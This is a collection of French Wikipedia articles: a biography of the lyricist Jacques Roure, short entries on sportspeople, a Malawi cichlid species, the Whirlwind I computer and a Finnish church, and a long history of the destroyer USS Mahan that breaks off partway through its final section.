En été 1993, Jacques Roure rencontre Claude Lemesle lors d'un stage à Salon-de-Provence et intègre sa masterclass à Paris ; il y fait la connaissance de Christophe Marie qui deviendra son compagnon d'écriture pour de nombreux textes. Pendant deux ans, il fréquente également régulièrement l'atelier chanson les à Gentilly. Les artistes et chanteurs commencent alors à s'intéresser à ses textes. Il écrit méthodiquement, des rimes .
Depuis lors, il alterne la signature de chansons pour des artistes de premier plan Serge Reggiani (1997), Lio (1999), Alice Dona (1999), Michèle Torr (2007) et les créations pour des chanteurs plus confidentiels. 
En 1995, il est l'auteur du texte "Ils sont un peu fous, les oiseaux" pour Anne Pékoslawska dans le spectacle "Féminin Plurielle" au théâtre Silvia Montfort à Paris. 
Il se joint à Claude Lemesle dans l'écriture, en 1997, d'une chanson pour Serge Reggiani qui sera titrée "Le vieux", single de l'album "Nos quatre vérités". Ce texte sur énergique et heureux, l'envie de garder la force d'espérer, reçoit un accueil favorable. 
Lors de la soirée d'ouverture du Festival "Emois de la chanson" au Théâtre Bompard de Marseille le , il interprète "Chansons volatiles", un spectacle mis en scène par Vince Castello qui sera également présenté l'année suivante à l'Hôpital Ambroise-Paré de Marseille.
Alice Dona confie à Christophe Marie et Jacques Roure, deux auteurs qu'elle , la rédaction d'un texte en rapport avec la doyenne de l'humanité Jeanne Calment, le titre sera "Je pense à l'âge". Par la suite, ils se rencontrent pour signer de nombreuses chansons pour les galas de province, comme Alice Dona en donne régulièrement. De leur collaboration naîtront dix textes de l'album "Couleurs de l'ombre", sorti en 1999 dont le titre phare "Dans ce monde là", enregistré avec la promotion 1999 de son école. Dans la postface d'un livre paru en 2004 "Cricri", un récit de souvenirs en hommage à sa petite sœur handicapée surnommée Cricri, Alice Dona publie le texte de la chanson "Cricri" dont elle a composé la musique sur les paroles de Jacques Roure et Christophe Marie. 
Toujours avec Christophe Marie, il prépare pour Lio les textes des chansons de la comédie musicale "Sept filles pour sept garçons" qui sera jouée en septembre et octobre 1999 aux Folies Bergère ; adaptation française de la comédie musicale américaine de 1954 "Seven brides for seven brothers" par Johnny Mercer et Gene Paul dont Stanley Donen avait tiré le film "Les Sept Femmes de Barbe-Rousse". Cependant, concurrencée avec d'autres comédies musicales, particulièrement "Notre Dame de Paris", ce spectacle ne trouve pas son public.
En 2002, en compagnie de Christophe Marie, Jacques Roure écrit pour son frère Daniel "Le temps d'un jazz" et "Les baleines bleues" avec des adaptations françaises de standards américains sur l'album éponyme. "Les baleines bleues" est un succès aux États-Unis et la chanson sera reprise dans la compilation 2013 "Vintage France" par le label Putumayo World Music. Le titre qui passe, début 2013, le cap des 5 millions d'auditeurs sur la webradio américaine de streaming Pandora donne lieu à une émission de France Musique
Entre 2002 et 2006, Jacques Roure collabore avec de jeunes artistes préparant leur premier album avec leurs propres chansons. Pour Lauren Faure, il écrit, avec Christophe Marie, le titre marquant"Toujours le temps" dans l'album "Regards de Femme" (classé, le , n° 88 du Top Albums France ). Deux ans plus tard, c'est la sortie du single "Un jour sans" écrit pour le premier album de Pedro Alves "Regarder une Femme". Alors qu'il participait au Festival d'Avignon, en chantant le répertoire de Serge Reggiani, le comédien de cinéma et de télévision Pascal Carré fait la connaissance de Jacques Roure ; de cette rencontre déterminante naîtront neuf textes de l'album "Du bout des yeux" sorti en 2006.
L'année suivante, il crée pour Michèle Torr, "C'était toi" et un titre en l'honneur de Sœur Emmanuelle "Son paradis c'est les autres". Michèle Torr est, en effet, la marraine de l'ONG "ASMAE - Association Sœur Emmanuelle" en faveur des enfants des bidonvilles du Caire. Ces chansons seront interprétées par Michèle Torr à l'Olympia du 10 au .
Depuis, il écrit surtout pour des chanteurs émergents, à commencer par "D'où je viens" destiné au premier album "" de son compagnon d'écriture Christophe Marie, pour le premier album de Marthélène "Démons des anges" ce sera "Sous la surface", trois titres pour l'artiste marseillais Alex Alistair ("Le port d'Anvers", "Les bons et les mauvais moments", "Jusqu'à vingt ans" dans l'album pop rock "Un pas s'avance") et pour Mehdi Sebbane "Algérienne".
En 2011, Jacques Roure compose, sur un texte de Christine Dailly, la musique de "Entre Boris et Bob" pour le premier album de Laurent Gatz et sa formation jazz, des musiciens de Véronique Sanson, "La qualité des éléments".
L'année suivante, il revient à l'écriture avec trois titres du premier album de récits vécus de la chanteuse de Graulhet Yona Pax, alias Françoise Cayla, "Un autre monde", un quatrième "Jusqu'à l'indécence" inclus dans le single "C'est l'été" et un cinquième "Ensemble nous irons" (coécrit avec Iza Loris, musique du compositeur et arrangeur Roger Loubet) pour son deuxième album "Quoi qu'on fasse", sorti en .
Pour la préparation du troisième album jazz de Daniel Roure il fait participer les auteurs présents au stage "Ecrivage", un atelier d'écriture bi-annuel d'une semaine en Savoie qu'il anime depuis 2006. L'album intitulé "Bar de nuit" sort en 2013. Comme pour ses deux précédents albums, Daniel Roure, un artiste relativement peu connu en France, est salué par des médias anglo-saxons, notamment via une programmation sur la BBC Radio Norfolk dans l'émission "The Late Paul Barnes". Concernant les chansons de l'album "Bar de nuit", écrites en français même si quelques phrases en anglais y sont incluses, la presse étrangère reconnaît la , du .
Il écrit, pour l'album d'Elias sorti en 2016, "Dans le bleu des yeux d'un ange".
En 2019, Jacques Roure interprète ses propres chansons dans l'album "Vulnérable" conçu avec le concours de Christophe Marie et Jean Paul Bondyfalat.

</doc>
<doc id="8729805" url="https://fr.wikipedia.org/wiki?curid=8729805" title="Saison 1 de New York, section criminelle">
Saison 1 de New York, section criminelle

Cet article présente la première saison de la série policière New York, section criminelle.
Synopsis de la saison.
Cette série met en scène une unité d'élite chargée d'enquêter sur des meurtres extrêmement violents en cernant la psychologie des meurtriers.

</doc>
<doc id="8729815" url="https://fr.wikipedia.org/wiki?curid=8729815" title="An Byong-jun">
An Byong-jun

An Byong-jun, né le à Kokubunji au Japon, est un footballeur international nord-coréen. Il évolue au poste d'attaquant.
Biographie.
Carrière en équipe nationale.
An Byong-jun est convoqué pour la première fois en sélection par le sélectionneur national Jo Tong-sop le , lors d'un match amical contre l'Irak (défaite 2-0).
Au total il compte deux sélections en équipe de Corée du Nord, obtenues en 2011.

</doc>
<doc id="8729817" url="https://fr.wikipedia.org/wiki?curid=8729817" title="Aulonocara jacobfreibergi">
Aulonocara jacobfreibergi

Aulonocara jacobfreibergi, communément appelé Cichlidé fée ou Eureka peacock, est une espèce de poissons d'eau douce de la famille des cichlidae endémique du lac Malawi en Afrique. Cette espèce est en première apparence assez calme, mais reste un cichlidae et par définition au moins territorial en période de reproduction.
Variétés géographiques.
Un grand nombre de variétés géographiques sont connues, influençant souvent de manière très significative mais parfois de façon infime les caractéristiques méristiques et la coloration (liste non exhaustive) :
Taille.
Cette espèce mesure adulte une taille maximale avoisinant les , parfois un peu plus en aquarium pour les plus vieux spécimens. Les femelles reste plus petites.
Dimorphisme.
Les sexes de cette espèce de cichlidae est comme beaucoup, très simplement différenciable. En effet, les mâles sont notamment nettement plus colorés et de plus grande taille. Les femelles restent donc plus petite et possède un fond de coloration terne, brun/grise/argenté. La nageoire anale de couleur orangé.
Reproduction.
Cette espèce est incubatrice buccale maternelle, les femelles gardent les œufs, larves et tout jeunes alevins environ 3 semaines, protéger dans leur gueule (sans manger ou en filtrant très légèrement les micro-détritus). Les mâles peuvent se montrer très insistants dès les premières maturités sexuelles des femelles, il préférable de maintenir cette espèce en groupes de plusieurs individus, de manière à diviser l'agressivité d'un mâle dominant sur plusieurs individus.
Alimentation.
Une alimentation à base de vers rouges ou vers de vase est fortement déconseillée.
Maintenance.
Comme la plupart des espèces de poissons du lac Malawi une température comprise en et est nécessaire pour une bonne maintenance. Un pH compris entre 7.5 et 8.0 ; un dH compris entre 9 et 19.
Statut IUCN.
Cette espèce de cichlidae est classé Préoccupation mineur (LC) sur la liste rouge des espèces menacées IUCN du fait de sa zone de répartition relativement grande dans le lac Malawi, répandue dans les régions méridionales. Notamment à Nkudzi, Monkey Bay, Nankumba, Îles Domwe ainsi que certaines autres régions.
Croisement, hybridation, sélection.
Il est impératif de maintenir cette espèce et le genre Aulonocara seul ou en compagnie d'autres espèces, d'autres genres, mais de provenance similaire (lac Malawi). toutes les femelles du genre étant très semblables. Le commerce aquariophile a également vu apparaitre un grand nombre de spécimens provenant d'Asie notamment et aux couleurs des plus farfelues ou albinos. En raison de la sélection, hybridation et autres procédés chimiques et barbares de laboratoires. Visuellement, de forme ou d'aspect parfois plus attrayant, mais l'aspect « voilé », « buble » ou autres aberrations et dégénérescences laissant la majorité du temps des troubles de comportement. "Aulonocara jacobfreibergi" étant certainement l'espèce du genre la plus recherchée.

</doc>
<doc id="8729828" url="https://fr.wikipedia.org/wiki?curid=8729828" title="Cichlidé fée">
Cichlidé fée



</doc>
<doc id="8729830" url="https://fr.wikipedia.org/wiki?curid=8729830" title="Eureka peacock">
Eureka peacock



</doc>
<doc id="8729832" url="https://fr.wikipedia.org/wiki?curid=8729832" title="Tournoi de tennis de Quito (ATP 2015)">
Tournoi de tennis de Quito (ATP 2015)

Le tournoi de Quito est un tournoi de tennis professionnel masculin. L'édition 2015, classée en catégorie ATP 250 Series, s'est disputée du 2 au .

</doc>
<doc id="8729838" url="https://fr.wikipedia.org/wiki?curid=8729838" title="Pávlos Mitrópoulos">
Pávlos Mitrópoulos

Pávlos Mitrópoulos (en grec : Παύλος Μητρόπουλος), né le à Aigion, est un footballeur grec. Il joue actuellement avec le Paniónios GSS, prêté par le Panetolikós FC.
Biographie.
Mitrópoulos fait ses débuts en professionnel avec l'Olympiakos Volos, remportant le titre de champion de la "Bêta Ethnikí" en 2009-2010. Cependant, l'Olympiakos Volos retourne en deuxième division après la saison 2010-2011, le club étant impliqué dans une affaire de match truqué. 
Le milieu de terrain signe alors au Panetolikós FC, tout juste promu en première division. Là aussi, Mitrópoulos joue de malchance car le club finit avant-dernier et est relégué à l'échelon inférieur. Il est alors prêté, lors de la deuxième partie de la saison 2012-2013, à l'AEK Athènes où il parvient à se faire une place. Dès le championnat achevé, il est de nouveau prêté, cette fois-ci au Paniónios GSS où il s'impose comme l'un des cadres de l'équipe.

</doc>
<doc id="8729841" url="https://fr.wikipedia.org/wiki?curid=8729841" title="Ivan Boukine">
Ivan Boukine

Ivan Andreïevitch Boukine (en , transcription anglophone : "Ivan Bukin") est un patineur artistique de danse sur glace russe né le à Moscou. Champion du monde junior 2013 avec sa partenaire Aleksandra Stepanova, il fait ses débuts chez les seniors lors de la saison suivante. En 2015, le couple obtient sa première médaille en grand championnat avec le bronze aux Championnats d'Europe de Stockholm.
Il est le fils d'Andreï Boukine, champion olympique de danse sur glace en 1988.
Palmarès.
Avec sa partenaire Aleksandra Stepanova

</doc>
<doc id="8729842" url="https://fr.wikipedia.org/wiki?curid=8729842" title="Grzegorz Kotowicz">
Grzegorz Kotowicz

Grzegorz Leon Kotowicz né le , est un kayakiste polonais pratiquant la course en ligne.

</doc>
<doc id="8729843" url="https://fr.wikipedia.org/wiki?curid=8729843" title="Fleur Maxwell">
Fleur Maxwell

Fleur Maxwell, née le à Dudelange dans le Grand-duché de Luxembourg, est une patineuse artistique luxembourgeoise.
Biographie.
Carrière sportive.
Fleur Maxwell commence à patiner à l'âge de neuf ans dans le "Cercle de Patinage de Remich" au sud-est du Grand-duché de Luxembourg. Elle fait ses débuts au niveau international junior lors de la saison 2002/03. Elle va participer à deux reprises aux championnats du monde junior, en février/ à Ostrava () et février/ à La Haye ().
Elle fait ses débuts au niveau international senior en 2004/05 et patine pendant sa carrière à huit championnats d'Europe et trois Championnats du monde senior. Ses meilleurs classements sont une européenne en 2005 à Turin et une mondiale senior en 2005 à Moscou.
Elle réussit à se qualifier aux Jeux olympiques d'hiver de 2006 à Turin où elle se classe , mais échoue aux deux olympiades suivantes de 2010 à Vancouver et de 2014 à Sotchi, sans doute à cause de son arrêt des compétitions pendant trois années de 2007 à 2009. Lors des Jeux de Turin en 2006, elle est la seule sportive Luxembourgeoise qualifiée, ce qui en fait le porte-drapeau de son pays.
Fleur Maxwell a également représenté son pays à de multiples compétitions internationales de second ordre, comme le Finlandia Trophy, le Nebelhorn Trophy, le Bavarian Open, la Coupe de Nice, la Golden Spin, le NRW Trophy, la coupe Merano, l'Ukrainian Open...

</doc>
<doc id="8729846" url="https://fr.wikipedia.org/wiki?curid=8729846" title="Lac d'Okrida">
Lac d'Okrida



</doc>
<doc id="8729854" url="https://fr.wikipedia.org/wiki?curid=8729854" title="Oni (série de jeux vidéo)">
Oni (série de jeux vidéo)

Oni est une série de jeux vidéo de rôle japonais débutée en 1990.
"Bakumatsu Kourinden: Oni".
 est un jeu vidéo de rôle au tour par tour à thème de mythologie japonaise. Le jeu a été développé par Pandora Box et édité par Banpresto pour la SNES. Il est sorti uniquement au Japon le . Il s'agit de la suite de "Kishin Kourinden ONI" dans la série "Oni" par Banpresto.
À la fin de la période Edo, des bateaux à vapeur accostent les côtes du Japon pour rompre son isolationnisme et avec l'objectif secret d'utiliser ses lieux surnaturels "Reiketsu", dont la force faiblit. Le Shogunat, se trouvant menacé par des forces internes et externes au Japon, crée la force spéciale "Shinsengumi", pour éliminer ces menaces surnaturelles ou non. Après avoir été attaqué par un esprit, l'adolescent Yamatomaru et le guerrier du "Shadow Shinsengumi" Mibu Juurouta partent à l'aventure.

</doc>
<doc id="8729855" url="https://fr.wikipedia.org/wiki?curid=8729855" title="Recording Industry Association of New Zealand">
Recording Industry Association of New Zealand



</doc>
<doc id="8729859" url="https://fr.wikipedia.org/wiki?curid=8729859" title="Lom Palanka">
Lom Palanka



</doc>
<doc id="8729862" url="https://fr.wikipedia.org/wiki?curid=8729862" title="Pablo García (basket-ball)">
Pablo García (basket-ball)

Pablo García, né le , à Las Villas, à Cuba, est un ancien joueur cubain de basket-ball. Il évolue durant sa carrière au poste d'ailier.

</doc>
<doc id="8729873" url="https://fr.wikipedia.org/wiki?curid=8729873" title="Whirlwind I">
Whirlwind I

Whirlwind I est un ordinateur à tubes à vide mis au point par le "Servomechanisms Laboratory" du MIT pour le compte de l’"US Navy" entre 1945 et 1951 ; il a ensuite servi jusque dans les années 1980. C'est l'un des premiers ordinateurs numériques qui produit des sorties en temps réel, le premier à employer de la mémoire à tores de ferrites, et l'un des premiers qui ne tend pas à simplement copier des calculateurs mécaniques antérieurs. Il servira de modèle pour la conception du Whirlwind II, lequel inspirera à son tour le système de défense aérienne SAGE de l’"United States Air Force" et, de façon indirecte, la plupart des ordinateurs d'affaires et les mini-ordinateurs fabriquées dans les années 1960.
Mené dans le contexte de la guerre froide, le développement du se fait sous l'égide du "Whirlwind Program" ou du "Whirlwind Project", lesquels sont mandatés à la fois par l’"Office of Naval Research" et l’"United States Air Force".
Mis en service en 1951, le sera plus tard intégré dans le système de défense aérienne SAGE. Le dernier ordinateur de ce type sera arrêté en 1983.

</doc>
<doc id="8729878" url="https://fr.wikipedia.org/wiki?curid=8729878" title="Yagoubitsa">
Yagoubitsa



</doc>
<doc id="8729886" url="https://fr.wikipedia.org/wiki?curid=8729886" title="Sviatoï Nos">
Sviatoï Nos

Sviatoï Nos (en , littéralement « Saint nez »), peut faire référence à :

</doc>
<doc id="8729889" url="https://fr.wikipedia.org/wiki?curid=8729889" title="Pojarévats">
Pojarévats



</doc>
<doc id="8729896" url="https://fr.wikipedia.org/wiki?curid=8729896" title="Dariusz Białkowski">
Dariusz Białkowski

Dariusz Bialkowski né le à Białogard, est un kayakiste polonais pratiquant la course en ligne. Il est le mari d'Aneta Michalak.

</doc>
<doc id="8729899" url="https://fr.wikipedia.org/wiki?curid=8729899" title="Église de Rajamäki">
Église de Rajamäki

L’église de Rajamäki () est une église luthérienne située dans le village de Rajamäki à Nurmijärvi en Finlande. L'église a été construite, pour ses employés, par la société Alko.
Description.
L'église de style fonctionnaliste présente de nombreux symboles chrétiens.
La tour de 48,1 mètres de hauteur porte une croix de 7 mètres de haut.
Les longs murs de l'église d'un seul tenant symbolisent la tunique du Christ.
La Sainte Trinité est rappelée par trois lustres de Paavo Tynell.
Le vitrail circulaire du mur méridional symbolise la lumière éternelle du royaume de Dieu.
L'évidement de l'autel est fait pour ressembler à un livre ouvert.
Les cloches électrifiées sont placées dans la tour qui est percée de trous aux volets réglables.
L'église attendra la fin de la guerre et même 1958 pour se mettre en quête d'un retable.
L'appel d'offre sera remporté par la fresque "Chemin, Vérité et Vie" d'Anna Räsänen.
Les deux murs de l'entrée portent les reliefs d'Arvi Tynys représentant le Sermon sur la montagne, Jésus bénissant les enfants.
Fait très rare dans une église luthérienne, l'église possède aussi une représentation de Madone, sculptée par Gunnar Uotila "la Madone de Rajamäki", qui est placée sur la façade de la chaire. 
L'œuvre a été financée par Karl August Fagerholm le directeur général d'Alko .

</doc>
<doc id="8729905" url="https://fr.wikipedia.org/wiki?curid=8729905" title="Chapelle Notre-Dame du Wacken">
Chapelle Notre-Dame du Wacken

La chapelle Notre-Dame du Wacken est située au numéro 6 rue Léon Boll dans le quartier du Wacken à Strasbourg.
Le Wacken ne possédait pas de lieu de culte, ainsi, en 1948, une fidèle légua sa maison à la paroisse Saint-Pierre-le-Jeune catholique afin qu’une chapelle y soit installée. L'édifice est aussi utilisé par les Scouts et Guides de France.

</doc>
<doc id="8729906" url="https://fr.wikipedia.org/wiki?curid=8729906" title="USS Mahan (DD-364)">
USS Mahan (DD-364)

L' est un destroyer de l'US Navy de la Seconde Guerre mondiale. Lancé en 1935, il est le premier navire de la classe Mahan et est nommé d'après le "rear admiral" Alfred Mahan, historien naval et théoricien stratégique du . La conception du navire apporta des avancées majeures par rapport aux précédents destroyers américains. Parmi celles-ci figuraient un troisième ensemble de tubes lance-torpilles quadruples, des abris de protection pour les canons, des générateurs diesel de secours ainsi qu'un système de propulsion à vapeur plus simple et plus efficace à utiliser. Le "Mahan" entra en service en 1936 et fut d'abord affecté à la flotte américaine de l'Atlantique, avant d'être transféré l'année suivante à Pearl Harbor. Lors de l'attaque japonaise le , le "Mahan" était en mer avec la Task Force 12 en mission vers l'île de Midway. Interrompant celle-ci, il participa à la recherche de la flotte ennemie mais sans succès et retourna à Pearl Harbor.
Au début de la guerre, le "Mahan" participa à des raids sur les îles Marshall et Gilbert. Lors de la bataille des îles Santa Cruz en octobre 1942, les amiraux Nimitz et Halsey félicitèrent le groupe de destroyers dont le "Mahan" faisait partie pour ses efforts remarquables dans la protection des porte-avions et contre des adversaires supérieurs en nombre. Au cours de la campagne de Nouvelle-Guinée visant à reprendre la côte nord-est de cette île aux Japonais, le "Mahan" participa aux débarquements amphibies à Salamaua, Lae et Finschhafen. Il prit part aux débarquements à Arawe et Borgen Bay, près du cap Gloucester, en Nouvelle-Bretagne, et apporta son soutien au débarquement des troupes sur l'île de Los Negros, dans les îles de l'Amirauté.
À la fin de la guerre du Pacifique, les kamikazes japonais intervinrent sans cesse pour tenter de contrer les opérations navales américaines. Le , un groupe d'avions suicide submergea le "Mahan" dans la baie d'Ormoc, à Leyte aux Philippines, et le mit hors d'état de combattre. En feu et commençant à exploser, le navire fut abandonné par son équipage, et un autre destroyer américain le coula avec des torpilles et des tirs d'artillerie.
Caractéristiques.
Le "Mahan" déplaçait à charge normale et à pleine charge. La longueur totale du navire était de pour une largeur de et son tirant d'eau était de . Il était propulsé par deux turbines à vapeur à engrenages de General Electric, qui développaient une puissance totale de () pour une vitesse maximale de (). Quatre Babcock &amp; Wilcox ou quatre Foster Wheeler, des chaudières à tubes d'eau, généraient la vapeur surchauffée nécessaire aux turbines. Le "Mahan" transportait un maximum de de fioul, avec une autonomie de () à 12 nœuds (). En temps de paix, son équipage était composé de 158 officiers et hommes enrôlés. En temps de guerre, l'effectif passait à environ 250 officiers et hommes d'équipage.
Le "Mahan" était équipé d'un mât avant tripode et d'un mât principal. Afin d'améliorer le champ de tir antiaérien, le mât avant tripode était construit sans gréement nautique. De profil, le navire ressemblait aux destroyers plus grands de la classe Porter qui l'avait immédiatement précédée. Il était équipé des premiers générateurs diesel de secours, qui remplaçaient les batteries de stockage des destroyers précédents. Des abris pour les équipes d'artilleurs furent construits à l'avant et à l'arrière pour les armes superposées. Un troisième ensemble quadruple de tubes lance-torpilles fut ajouté, avec un support sur la ligne centrale et deux sur les côtés. Cela nécessita le déplacement d'un canon de 5 pouces/38 calibres vers le pont arrière. Le "Mahan" intégrait une nouvelle génération de machines à vapeur basée sur des modèles terrestres. La pression des chaudières atteignait (livre par pouce carré) et les turbines à haute pression étaient équipées de réducteurs à double réduction, qui fonctionnaient plus rapidement et plus efficacement que ceux de ses prédécesseurs.
Armement.
La batterie principale du "Mahan" était composée de cinq canons de 5 pouces/calibre 38, puis de quatre en 1942, équipés du système de contrôle de tir Mark 33. Chaque canon était à double usage, configuré pour les cibles terrestres et aériennes. Sa batterie antiaérienne comprenait à l'origine quatre mitrailleuses de calibre .50 refroidies à l'eau. Le navire était équipé de trois tubes lance-torpilles quadruples pour douze torpilles de , guidées par le système de contrôle de tir Mark 27. Des supports de lancement de grenades sous-marines étaient installés à l'arrière du navire.
Au début de l'année 1942, les destroyers de la classe Mahan commencèrent un processus de réarmement pour temps de guerre, mais la plupart des navires de cette classe ne furent entièrement réarmés qu'en 1944. Le "Mahan" fut réarmé en juin 1944 au chantier naval de Mare Island. Parmi les réaménagements notables de la classe Mahan, on peut citer le retrait d'un canon de 5 pouces/38, généralement remplacé par deux canons jumelés Bofors 40 mm et cinq canons de 20 mm Oerlikon.
Construction.
Le "Mahan" a été construit par United Dry Docks (successeur de la ) à Staten Island, à New York. Sa quille fut posée le et il a été lancé le , parrainé par Kathleen H. Mahan, l'arrière-petite-fille de l'amiral. Le navire fut mis en service le . Il prit la mer pour les ports des Caraïbes et d'Amérique du Sud dans les deux mois qui suivirent sa mise en service, combinant sa formation initiale et sa croisière d'essai avec une tournée de bonne volonté. Il resta dans l'Atlantique jusqu'en juillet 1937, puis se dirigea vers la côte sud de la Californie pour s'entraîner avec la flotte avant de mettre le cap vers sa nouvelle base à Pearl Harbor.
Carrière.
Les tensions croissantes entre le Japon et les États-Unis débutent en 1931, avec l'invasion japonaise de la Mandchourie lors de l'incident de Mukden. Les agressions continues du Japon, qui a déclenché la guerre sino-japonaise en 1937 et l'invasion de l'Indochine française en 1940, auxquelles les États-Unis et les puissances européennes répondirent par des embargos sur les importations de fer et de pétrole, ont encore exacerbé ces tensions. Les Japonais décidèrent alors d'attaquer les puissances occidentales en Asie, en commençant par une attaque surprise contre la base navale américaine de Pearl Harbor. Lorsque les Japonais frappèrent celle-ci le , le "Mahan" était en mer avec le porte-avions , trois croiseurs et quatre destroyers dans le cadre de la Task Force 12. La mission du "Lexington" était de transporter des avions de la Marine pour renforcer l'île de Midway. Après avoir appris la nouvelle de l'attaque sur Pearl Harbor, le commandant de la force opérationnelle reçut l'ordre de mettre fin à sa mission de transport et de rechercher la force de frappe japonaise. Incapable de la localiser, la force opérationnelle américaine retourna à Pearl Harbor le .
Le "Mahan" prit la mer fin décembre avec 103 marines à son bord pour renforcer leur détachement à l'atoll Johnston (à environ 750 milles marins — 1 390 km — à l'ouest d'Hawaï), et évacua 47 civils vers Hawaï le mois suivant. Une mission de convoi conduisit le "Mahan" à Samoa, où il rejoignit la Task Force 17 (comprenant le porte-avions , deux croiseurs et cinq destroyers). Cette force opérationnelle mena des raids sur les atolls de Jaluit, de Mili et de Makin (Butaritari) dans les îles Marshall et les îles Gilbert. Le "Mahan" se rendit à l'île de Canton à la fin du mois de février 1942, où il fut temporairement affecté à des missions de patrouille au large. Début avril, il était en mer avec un convoi à destination de San Pedro, en Californie. Le navire a ensuite mis le cap au nord vers le chantier naval de Mare Island pour y être révisé, où il a accosté le .
Le "Mahan" était de retour dans les eaux au large de Pearl Harbor en août 1942. À la mi-octobre, il avait quitté Pearl Harbor dans le cadre de la Task Force 16 avec le porte-avions , le cuirassé , deux croiseurs et sept destroyers. Le 24 octobre, ils rejoignirent la Task Force 17, qui comprenait le porte-avions , quatre croiseurs et six destroyers. Les deux groupes de porte-avions formèrent la Task Force 61 sous le commandement du contre-amiral Thomas C. Kinkaid et reçurent l'ordre de se rendre aux îles Santa Cruz pour attaquer les Japonais s'ils se déplaçaient vers Guadalcanal.
Après que le groupe naval eut jeté l'ancre au large des îles le matin du 26 octobre, les avions de reconnaissance de l' "Enterprise" repérèrent la force aérienne ennemie et larguèrent deux bombes de sur le porte-avions japonais "Zuihō", déclenchant ainsi la bataille des îles Santa Cruz. À l'issue de la bataille, la marine américaine avait perdu 74 avions, le porte-avions "Hornet" et un destroyer ; l"'Enterprise", le "South Dakota", un croiseur et un destroyer avaient été endommagés. Les Japonais perdirent une centaine d'avions, mais leurs pertes en navires furent beaucoup moins importantes. Nimitz et Halsey exprimèrent leur satisfaction à l'égard de la force navale de Kinkaid et de leur combat contre une force japonaise supérieure, et les destroyers des escortes du "Hornet" et de l’"Enterprise" furent félicités pour leurs efforts remarquables.
En route vers Nouméa, en Nouvelle-Calédonie, le , la détection d'un sous-marin japonais contraignit les navires américains à prendre des mesures d'évitement. Dans la confusion, le "Mahan" et le cuirassé "South Dakota" entrèrent en collision : les deux navires furent gravement endommagés. Le commandant R. W. Simpson était alors le capitaine du "Mahan", ayant pris son commandement au début de l'année 1941. Des réparations temporaires furent effectuées sur le "Mahan" à Nouméa, puis il reprit la route vers Pearl Harbor pour y être équipé d'une nouvelle proue.
Entièrement réparé, le "Mahan" quitta Pearl Harbor le 9 janvier 1943 pour le Pacifique Sud. Au cours des mois suivants, il escorta des convois entre les Nouvelles-Hébrides et les îles Fidji, effectua des missions de patrouille au large de la Nouvelle-Calédonie et participa à des opérations dans les eaux australiennes. En août, sa base d'opérations était Milne Bay, en Nouvelle-Guinée, qui, avec Buna, servait de zone de rassemblement pour une avancée visant à prendre possession de la côte nord-est de la Nouvelle-Guinée, alors sous contrôle japonais. L'opération débuta en août 1943, avec pour objectif d'attaquer Lae, en Nouvelle-Guinée. Deux semaines plus tôt, le "Mahan", sous le commandement du capitaine de corvette James T. Smith, et trois autres destroyers américains avaient dégagé les abords de Lae et les eaux entre Salamaua et Finschhafen, bombardant les installations japonaises à Finschhafen. Début septembre, la force opérationnelle américaine, sous le commandement du contre-amiral Daniel E. Barbey, quitta Milne Bay pour Lae avec soldats australiens. Le soir du , le débarquement des troupes était terminé. Le , Salamaua était sous le contrôle des Alliés et Lae fut prise le .
Vaincus à Lae, les Japonais se replièrent vers Finschhafen, que les Américains et les Australiens choisirent comme site de leur prochaine offensive. Le , une force d'assaut commandée par Barbey quitta Buna, escortée par des destroyers américains, dont le "Mahan", et fit escale à Lae pour embarquer une brigade d'infanterie australienne. D'autres destroyers américains se joignirent à la force, précédant le convoi jusqu'au point de rendez-vous&lt;. Le , avant le lever du jour, la force amphibie prit d'assaut la plage de Finschhafen ; à midi, toutes les troupes étaient à terre. Alors que les destroyers commençaient à se retirer de la zone, dix avions torpilleurs japonais survolèrent la mer, prenant pour cible le "Mahan" et cinq autres destroyers américains. Les navires ripostèrent, abattant huit des dix avions ; les deux autres réussirent à s'échapper. Cette escarmouche se termina sans qu'aucun autre avion ennemi ne soit touché. Le , Finschhafen était aux mains des Alliés.
Le 14 décembre 1943, la force amphibie dirigée par Barbey se rassembla à Buna, en Nouvelle-Guinée, en vue du débarquement à Arawe, en Nouvelle-Bretagne. Elle était accompagnée d'un groupe de bombardement composé du "Mahan" et de quatre autres destroyers américains. Ayant pris la mer le 14, la force jeta l'ancre au large d'Arawe tôt le lendemain matin, et le "Mahan" et ses navires jumeaux bombardèrent les défenses côtières japonaises au point de débarquement principal. Les tirs des canons de 5 pouces/38 et des roquettes tirées par des bazookas contraignirent les Japonais à battre en retraite, et en milieu de matinée, la tête de pont était sécurisée.
À Noël 1943, le "Mahan" naviguait avec la force amphibie de Barbey vers la baie de Borgen, près du cap Gloucester, en Nouvelle-Bretagne. L'entrée de la baie de Borgen était risquée, car les eaux n'étaient pas cartographiées ; le "Mahan" et le "Flusser" (DD-368) furent choisis pour sonder le chenal et baliser le chemin. Ils avancèrent dans le chenal, suivis de deux dragueurs de mines qui posaient des bouées dans leur sillage. Le reste de la force navale suivit les bouées et franchit le passage. Le matin du 26, les Marines débarquèrent sur la plage sans rencontrer de résistance. Les Japonais ripostèrent avec force plus tard dans l'après-midi, mais les Américains ne se laissèrent pas déloger.
À la fin du mois de février 1944, le "Mahan" était en action avec la flotte pour soutenir le débarquement des troupes sur l'île de Los Negros, dans les îles de l'Amirauté. Bien que les navires de soutien aient essuyé des tirs nourris, les troupes réussirent à débarquer. Trois semaines plus tard, les forces japonaises à Los Negros étaient vaincues.
Au début de l'année 1944, après une longue période de service dans le Pacifique, le destroyer vétéran fut envoyé en Californie pour être révisé et fut de nouveau amarré à un quai du chantier naval de Mare Island. Le "Mahan" quitta ce chantier naval début juillet pour Pearl Harbor, où il participa à des exercices jusqu'au . Il retourna en Nouvelle-Guinée le via Eniwetok, Jaluit, Guam, Saipan et Ulithi, escortant des convois entre Hollandia (aujourd'hui Jayapura) et Leyte. À la fin du mois de novembre 1944, le "Mahan" effectuait des patrouilles anti-sous-marines au large de Leyte, aux Philippines.
Destruction.
En novembre 1944, les mauvaises conditions météorologiques et le terrain hostile ralentirent la campagne terrestre visant à reprendre Leyte aux Japonais. Le principal obstacle à la reconquête de cette île des Philippines était la capacité des Japonais à renforcer et à réapprovisionner leur quartier général à Ormoc, à l'ouest de Leyte, et l'incapacité des Américains à contrer cet avantage. La décision inévitable fut donc prise de lancer une attaque amphibie sur Ormoc.
